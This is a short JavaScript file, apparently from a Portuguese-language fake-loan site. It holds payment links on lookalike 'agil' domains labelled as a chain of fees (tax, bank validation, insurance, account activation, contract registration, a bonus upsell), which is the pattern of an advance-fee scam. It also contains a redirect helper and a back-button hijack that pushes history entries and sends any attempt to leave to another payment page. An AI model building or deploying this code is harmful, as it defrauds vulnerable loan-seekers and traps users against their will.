   const baseLinks = {
  up1: "https://pay.app-agil.online/PyE2Zy8MKb23qRb", // IOF
  up2: "https://pay.agil-app.online/rn4RgQvoeDW3wBV", // Validação Bancaria
  up3: "https://pay.agilbank.site/5pjw3RnOLQ032lQ", // Seguro Prestamista "tarifa de cadastro"
  up4: "https://pay.app-agil.shop/YL9jZDWVLKl3p4q", // NFe
  up5: "https://pay.app-agil.fun/QqyLgqolO7JZvkE", // Ativar conta
  up6: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // Taxa de registro do contrato
  up7: "https://pay.app-agil.shop/4KovG1Q8YnQGyDE", // ParabÃ©ns, 20k adicional
  up8: "https://google.com", // Erro no pagamento - 14,06
  up9: "https://google.com", // APP - 11,99
  up10: "https://google.com", // Taxa de Abertura TAC - 16,92
  up11: "https://google.com", // Taxa de Consultoria Financeira - 19,53
  up12: "https://google.com", // Taxa de Processamento Administrativo - 31,92
};

function redirect(key) {
  try {
    if (!baseLinks[key]) {
      throw new Error(`Link para ${key} não encontrado!`);
    }

    const url = new URL(baseLinks[key]);
    url.search = new URLSearchParams(window.location.search).toString();

    window.location.href = url.href;
  } catch (error) {
    console.error("Erro no redirecionamento:", error);
    alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
  }
}


const backRedirectBackLink =
  "https://pay.app-agil.online/v7R0gloJxP6GVr9";

// Adiciona duas entradas no histÃ³rico para capturar a navegaÃ§Ã£o para trÃ¡s
history.pushState({}, "", location.href);
history.pushState({}, "", location.href);

// Captura o evento de navegaÃ§Ã£o para trÃ¡s e redireciona
window.onpopstate = function () {
  setTimeout(() => {
    location.href = backRedirectBackLink;
  }, 1);
};